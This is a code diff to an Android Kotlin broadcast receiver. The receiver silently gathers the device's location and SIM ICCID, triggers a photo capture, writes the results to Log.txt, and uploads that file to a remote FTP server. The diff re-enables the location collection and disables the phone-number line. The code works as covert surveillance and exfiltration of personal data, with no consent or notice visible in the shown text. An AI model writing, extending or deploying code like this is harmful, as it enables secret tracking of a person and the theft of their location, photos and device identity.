@@ -20,16 +20,17 @@ public class MyBroadcastReceiver: BroadcastReceiver() {
         Log.i("reciever","reciever:context:"+p0)
         //MessageCollector.setMyContext(p0!!);
         var str = SimpleDateFormat("yyyy-MM-dd-HH:mm:ss").format(Date())+ "\n";
-        //str = str + MessageCollector.getLocation()+"\n";
+        str = str + MessageCollector.getLocation()+"\n";
 
         str = str + "iccid:"+MessageCollector.getIccid()+"\n";
 
-        str = str + "PhoneNumber:" +MessageCollector.getNativePhoneNumber()+"\n";
+        //str = str + "PhoneNumber:" +MessageCollector.getNativePhoneNumber()+"\n";
         str = str + "-----------------------\n"
 
 
         MessageCollector.setMyContext(p0!!);
         MessageCollector.takePic();
+
 
 
         Log.i("dir2",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Log.txt")
@@ -48,6 +49,8 @@ public class MyBroadcastReceiver: BroadcastReceiver() {
             output.write(str.toByteArray());
             output.close()
             MyFTPClient.uploadFile("","Log.txt",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Log.txt")
+
+
         }).start()
 
 
